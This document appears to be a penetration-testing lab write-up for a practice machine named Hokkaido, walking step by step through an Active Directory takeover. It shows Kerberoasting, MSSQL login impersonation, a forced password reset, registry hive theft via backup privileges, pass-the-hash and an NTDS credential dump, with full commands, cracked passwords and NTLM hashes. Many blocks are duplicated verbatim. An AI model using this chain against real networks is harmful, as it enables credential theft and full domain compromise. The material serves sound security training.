When checking for same username and password reuse, I get a hit on info:info:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc ldap 192.168.211.40 -u usernames.txt -p usernames.txt --no-bruteforce

$krb5tgs$23$*discovery$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com\discovery*$e5c4d028767749d32e21dc772c42edcf$07aeac60456891fa4aab34f74bf196c0d3dbd93658df2da1820c50804c12dbf8bf7f9e566a8c64a30efe83db961ac1fbcdcebb148d061ef4bd562e978c69a1299749b77f66d640f9fbcc7ed1aa1ead167937a76800f4587955160514e97fc17e7e5680c8f2c8e66ca1ca5979af30aad1197e74f1ebe6f974437b24292390a1cefeae7fec482254cc0ba05631417a7323cfa89caca554e958e7e4f8fcbc1dd89c5c2e344d6a4a2d9470f8333be8f4fc1a3fa318980a870cd9125724881c6f8fd016f70f885f93be501aa593ae5c85a9fb8d93331f6efa103fc1b8f59ddc9b6a60f04e84a2af1d4569394a0714198189aec159114f7f10a654ed46aca15c0f47c1b505aaccf17e4267bb95d86f55358fca40acb47aa5f3ddd98447ef89254cb749f20693bb899063cb2f6a8f888bc8454ba839566379f3eb178b939ce0f15e139ac1b04f546f3b3f36bdeced5858aba7a7c18b276357dd28be12affb8cc1992c4de422c2e0fbf1404c4dfde7637c5ba7ec4643e636b376e2b668addd9e4348b5351012df61cf1b960e7886d94ff3415f16c68b95ea3ae7f4e9762769ff746bcb033df4651438c6d9baff5f888381e17c1323f80317faf3eb0f32298d1c7770d6f9002494f98983d98babc0faa44894dc914ff55ed04374564a8d0083e1821fa6a3bb0a3ca9c994684ba4e5af817fd0d5ada9bcb7a82377498ba136b19a6f69ae5795ccf61b2aebab6f4aaa6e178d99b74ab192c20e4527e8fc08b7eb7d60884997a93c2cb6928953f2fc529edc06a9f56a0dd2821c2a1f1b1c6801a9eb948de0ba2ba7b8a88801874a7074bb0c35dbc66628eaddcde8d615466f1e7dcdd854c710af121f4cd1b6bc91f52a1f2e7dedd585c6dd9e80fd70ade5c166720192de17c0b5469a219e44219a64c45f9e12719bffbf2faf82f0a8332cdccc6d8f1ebabc9f742a9cc63ec2b455f9d42203c3aee2c0b93713105905f403b8ffa15b2f3064642f8253a64c805456eeb06dda3cf931f217322b476885f3d14790545535b0c789446fa31e08921e29a0eafeabee0c6a8ce9a8fb2ff34e131e808e628ea8139424fe5e47dc812efde31f73a2fe5f00f3a508e8969e2a12c25b0b215ef0cda961cf98962a19ea44ec45b769530e70629b54358b92b64db997f2144afd9658e8c5edf549075d0b3810fffdc94ab484658d0278eaa71ea228365f2885cd7305dd4c94d3e17aebff79fec48d26eca1e10a199b8fc33b7a265935e926db39cc3a3fe1634fdcf988f70840d58b6a795908f0af598dc6e041bd0c69c7120df7cf5bff9b2cb6dae70f80c57724ed532a134454bc43931f5b7b7fb4f2e42bd25b01909d79893e2d9c8da0a484b00f07ee874715bfa6aea4cb530a6d7da7a8a84821e6a9819290eda2cc12142c5da03bb18e5ffb182f6a793db1111f8fb6c43637260e2f32095233df92b8860394c5699c48cbc611d46982986e392abe70f28a20:Start123!

The credentials of discovery can be used against the MSSQL application:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ impacket-mssqlclient discovery@192.168.211.40 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (HAERO\discovery  guest@master)> 

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ impacket-mssqlclient discovery@192.168.211.40 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (HAERO\discovery  guest@master)>

This discovery user is allowed to impersonate as the hrappdb-reader:

SQL (HAERO\discovery  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee          grantor          
----------   --------   ---------------   ----------   --------------   --------------   
b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader   
SQL (HAERO\discovery  guest@master)> 
SQL (HAERO\discovery  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee          grantor          
----------   --------   ---------------   ----------   --------------   --------------   
b'LOGIN'     b''        IMPERSONATE       GRANT        HAERO\services   hrappdb-reader   
SQL (HAERO\discovery  guest@master)>

By impersonating as this user, we have access to the hrappdb database:

SQL (HAERO\discovery  guest@master)> exec_as_login hrappdb-reader
SQL (hrappdb-reader  guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0   
tempdb                    0   
model                     0   
msdb                      1   
hrappdb                   0   
SQL (hrappdb-reader  guest@master)> use hrappdb;
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> 
SQL (HAERO\discovery  guest@master)> exec_as_login hrappdb-reader
SQL (hrappdb-reader  guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0   
tempdb                    0   
model                     0   
msdb                      1   
hrappdb                   0   
SQL (hrappdb-reader  guest@master)> use hrappdb;
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
SQL (hrappdb-reader  hrappdb-reader@hrappdb)>

Then checking the database shows one table called sysauth which contains the password Untimed$Runny of the user hrapp-service:

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'   
SQL (hrappdb-reader  hrappdb-reader@hrappdb)>
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'   
SQL (hrappdb-reader  hrappdb-reader@hrappdb)>

And the credentials seems to work successfully:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u hrapp-service -p 'Untimed$Runny'         
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\hrapp-service:Untimed$Runny
┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u hrapp-service -p 'Untimed$Runny'         
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\hrapp-service:Untimed$Runny

After uploading domain data to BloodHound, I notice the user hrapp-service has GenericWrite privileges over the user hazel.green:

We can perform targeted Kerberoasting against the user hazel.green as the user hrapp-service:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Hazel.Green)
[+] Printing hash for (Hazel.Green)

e34ddeff488daf4c70be733697784aeb38c98387a002af713e1f87a27a08b621e58f6304b69eb57e44116e9492b3398e07bb89a75716b3d7cf09380a175d3766d2e79b35156c5aeb3ac62382cdfb0dfb82c8f11410607469fc0fcbbad10949f780d633420625cf7c7d6a429e78a9d49662093884b07b8aad2b8ecae4531c21ea0b436be398fc8de955f9f6120205a78d19cee43c76355dda956b3a2b2a199ee45e32ccaef21844385eea3464cf1d85c9bf8b3cfdb3b4bcabddaaa524678b71fef17799e80b311484da45404a1b2e23cdb3a3287a47ee5b67d8da0a898e5b7

Crack the hash successfully to obtain the password haze1988:

$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$f6a06c68c23d4e8f907c247992751dbf$24f134250c23e3e7fad5c1b6c9a2cf24d2f97789c0283398c6e94db1b2c13c1b571e8f45e9b9732d2a2201da990fccaccb87571bc847a99e0d322c48e8e36f95a1b740c97ff47708aff63d79e34b283226a702b9f4f12172ae347541c3297f69d9e6ab876c7a3b0f5d13bbc03c8cf522f51dbd8d408f3c3d2c36689911cc25cbab833b18b03a2c67751ca25fd6ff2cf43aecd146a90d483d77639f59d7aa293d847cdd2a8877f1fa86dcb7419d7f5aba6009e374ffc3fab7e70007f4a315ac24d20d9c1473aa55690fd61c09948a589ef483101560b8f6923629c2560447e5b8ee8f5faa9b05b1222bd27c4c529499ddaec6a1bd2d572934931277383551e2a9e2e49763189b3ac7e9704a746d055729d4bfa847063802718ccc0fee94e07ba767d3e3b4a6faeb9fa31d2248795388ca4ef004a24e00267d09bf435b184715fd82a56f673e1013c82e6590040a21b25529ac175225873d00a633910292daf3897c8ca2663c840afa681d9fe13255a7056091dec249287138abe44d7ff191c506cd40af20e266bf8c04d7190747849edae6717ac56e3afbf807136d8fb971672bb845bb0a214df116ba262fa7febc2685db47841e1bc291db2e320b6822a7b7802f027c9c9d4346302eab4e5816a708318beb3c3a8719bed5b496456f3fc7c35ae50a1b21104ff970e8b18974bd8c669efe65da055a31cbf38d04bbcb0d538bd306d3694296aad139e2e5d3daa6dfa94568edd52ce43e1c67d6b7f36323a6746b2b7dc6660a3b4e2317c17889874093c4aab0bf38491867df2b56c3abe221d339e36097b4c0d07e8ee7d8ca4d6f725790c7b871beb2ef53bc2b0fee9d4a854d12f21afdff4e37adec072e7462a28aac7f7bef0845b86fdda9c5e79f2fa37b44e6f7713398f2d2ef48b590df9aa1a288887fe4895b8b5607279ebe86b7efa8ec896a9bfbaebf07700d3ce3b124c36f1bd1d7a4b1f6b4177674dfdf802e2342cca2adeebcd5a40153ac48d06b383e275569071c6b8928dba66f6365e345119206bef470582f4b1e65a86a1a21b994371e16d58b4b38c881e77774c12d5ed79e21f9cff4e8b7420ebef611a5e23a6cee72f8a463d81f6f5d7187648dc4cb22226c79abbeb56b844f8cd454a9fb924231859d7b148b73439afa424d1cb43d23665d6f3aeb5cdb0088ba3a6ee36ebc58b63b8d0f944957bc7659bf0c595a0bcae740792386011c2908809ad1da42381ae0b4c24ef476c5dfb55e1db47a1373cdaeb23af71e360df2655478285dde615af34790d54792654bad6d26841a74d3103ad7f1099b005cc802a2fc36bf89c4168e34ddeff488daf4c70be733697784aeb38c98387a002af713e1f87a27a08b621e58f6304b69eb57e44116e9492b3398e07bb89a75716b3d7cf09380a175d3766d2e79b35156c5aeb3ac62382cdfb0dfb82c8f11410607469fc0fcbbad10949f780d633420625cf7c7d6a429e78a9d49662093884b07b8aad2b8ecae4531c21ea0b436be398fc8de955f9f6120205a78d19cee43c76355dda956b3a2b2a199ee45e32ccaef21844385eea3464cf1d85c9bf8b3cfdb3b4bcabddaaa524678b71fef17799e80b311484da45404a1b2e23cdb3a3287a47ee5b67d8da0a898e5b7:haze1988
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$f6a06c68c23d4e8f907c247992751dbf$24f134250c23e3e7fad5c1b6c9a2cf24d2f97789c0283398c6e94db1b2c13c1b571e8f45e9b9732d2a2201da990fccaccb87571bc847a99e0d322c48e8e36f95a1b740c97ff47708aff63d79e34b283226a702b9f4f12172ae347541c3297f69d9e6ab876c7a3b0f5d13bbc03c8cf522f51dbd8d408f3c3d2c36689911cc25cbab833b18b03a2c67751ca25fd6ff2cf43aecd146a90d483d77639f59d7aa293d847cdd2a8877f1fa86dcb7419d7f5aba6009e374ffc3fab7e70007f4a315ac24d20d9c1473aa55690fd61c09948a589ef483101560b8f6923629c2560447e5b8ee8f5faa9b05b1222bd27c4c529499ddaec6a1bd2d572934931277383551e2a9e2e49763189b3ac7e9704a746d055729d4bfa847063802718ccc0fee94e07ba767d3e3b4a6faeb9fa31d2248795388ca4ef004a24e00267d09bf435b184715fd82a56f673e1013c82e6590040a21b25529ac175225873d00a633910292daf3897c8ca2663c840afa681d9fe13255a7056091dec249287138abe44d7ff191c506cd40af20e266bf8c04d7190747849edae6717ac56e3afbf807136d8fb971672bb845bb0a214df116ba262fa7febc2685db47841e1bc291db2e320b6822a7b7802f027c9c9d4346302eab4e5816a708318beb3c3a8719bed5b496456f3fc7c35ae50a1b21104ff970e8b18974bd8c669efe65da055a31cbf38d04bbcb0d538bd306d3694296aad139e2e5d3daa6dfa94568edd52ce43e1c67d6b7f36323a6746b2b7dc6660a3b4e2317c17889874093c4aab0bf38491867df2b56c3abe221d339e36097b4c0d07e8ee7d8ca4d6f725790c7b871beb2ef53bc2b0fee9d4a854d12f21afdff4e37adec072e7462a28aac7f7bef0845b86fdda9c5e79f2fa37b44e6f7713398f2d2ef48b590df9aa1a288887fe4895b8b5607279ebe86b7efa8ec896a9bfbaebf07700d3ce3b124c36f1bd1d7a4b1f6b4177674dfdf802e2342cca2adeebcd5a40153ac48d06b383e275569071c6b8928dba66f6365e345119206bef470582f4b1e65a86a1a21b994371e16d58b4b38c881e77774c12d5ed79e21f9cff4e8b7420ebef611a5e23a6cee72f8a463d81f6f5d7187648dc4cb22226c79abbeb56b844f8cd454a9fb924231859d7b148b73439afa424d1cb43d23665d6f3aeb5cdb0088ba3a6ee36ebc58b63b8d0f944957bc7659bf0c595a0bcae740792386011c2908809ad1da42381ae0b4c24ef476c5dfb55e1db47a1373cdaeb23af71e360df2655478285dde615af34790d54792654bad6d26841a74d3103ad7f1099b005cc802a2fc36bf89c4168e34ddeff488daf4c70be733697784aeb38c98387a002af713e1f87a27a08b621e58f6304b69eb57e44116e9492b3398e07bb89a75716b3d7cf09380a175d3766d2e79b35156c5aeb3ac62382cdfb0dfb82c8f11410607469fc0fcbbad10949f780d633420625cf7c7d6a429e78a9d49662093884b07b8aad2b8ecae4531c21ea0b436be398fc8de955f9f6120205a78d19cee43c76355dda956b3a2b2a199ee45e32ccaef21844385eea3464cf1d85c9bf8b3cfdb3b4bcabddaaa524678b71fef17799e80b311484da45404a1b2e23cdb3a3287a47ee5b67d8da0a898e5b7:haze1988

And the credentials seems to work successfully:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u hazel.green -p haze1988                   
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\hazel.green:haze1988
┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u hazel.green -p haze1988                   
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\hazel.green:haze1988

This new user belongs to two more groups: IT and Tier2-Admins. This grants this user the ForceChangePassword over the molly.smith user account:

When changing the password of user molly.smith using rpc and bloodyAD, I kept on getting error messages. When looking at different methods from this post, I successfully changed the password of molly.smith user:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ rpcclient -U hokkaido-aerospace.com/hazel.green 192.168.211.40
Password for [HOKKAIDO-AEROSPACE.COM\hazel.green]:
rpcclient $> setuserinfo molly.smith 23 Password@789
rpcclient $>

.....SNIP....

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u molly.smith -p 'Password@789'             
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\molly.smith:Password@789
┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ rpcclient -U hokkaido-aerospace.com/hazel.green 192.168.211.40
Password for [HOKKAIDO-AEROSPACE.COM\hazel.green]:
rpcclient $> setuserinfo molly.smith 23 Password@789
rpcclient $>

.....SNIP....

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u molly.smith -p 'Password@789'             
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\molly.smith:Password@789

When looking at the group membership of this user, I notice the Server Operators group stands out:

They have the SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services. This means we could make a copy of the ntds.dit database to obtain the domain credentials. Also this user has RDP access to the DC.

Now I have RDP access:

The local.txt flag is also shown above.

Earlier I noticed this user belongs to the Server Operators group. However, the SeBackupPrivilege and SeRestorePrivilege privileges were missing. I opened CMD as administrator using the credentials of this user and obtained its privileges:

Download the two DLL files to enable the SeBackupPrivilege from here. Transfer the two DLLs to the machine and enable the privilege again:

Inside the same cmd session, make a copy of the sam and system hives and then transfer it back to our attack machine:

PS C:\Temp> reg.exe save hklm\sam sam.save
The operation completed successfully.
PS C:\Temp> reg.exe save hklm\security security.save
ERROR: Access is denied.
PS C:\Temp> reg.exe save hklm\system system.save
The operation completed successfully.
PS C:\Temp> reg.exe save hklm\sam sam.save
The operation completed successfully.
PS C:\Temp> reg.exe save hklm\security security.save
ERROR: Access is denied.
PS C:\Temp> reg.exe save hklm\system system.save
The operation completed successfully.

Extract the credentials from the two hives to obtain the NTLM hash of Administrator:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ impacket-secretsdump -sam sam.save -system system.save local     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ impacket-secretsdump -sam sam.save -system system.save local     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...

With the NTLM hash of Domain Administrator, we have DA access which we can use to dump the NTDS.dit database:

┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u Administrator -H d752482897d54e239376fddb2a2109e4
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\Administrator:d752482897d54e239376fddb2a2109e4 (Pwn3d!)
                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/Labs/Hokkaido]
└─$ nxc smb 192.168.211.40 -u Administrator -H d752482897d54e239376fddb2a2109e4 --ntds
SMB         192.168.211.40  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.211.40  445    DC               [+] hokkaido-aerospace.com\Administrator:d752482897d54e239376fddb2a2109e4 (Pwn3d!)
SMB         192.168.211.40  445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.211.40  445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
SMB         192.168.211.40  445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.211.40  445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e1a2efb311b464c23a72ee9ba4071a37:::
SMB         192.168.211.40  445    DC               hokkaido-aerospace.com\Hazel.Green:1106:aad3b435b51404eeaad3b435b51404ee:a921ee3ff4e1f1fdb4d82f2f49ac3f4f:::
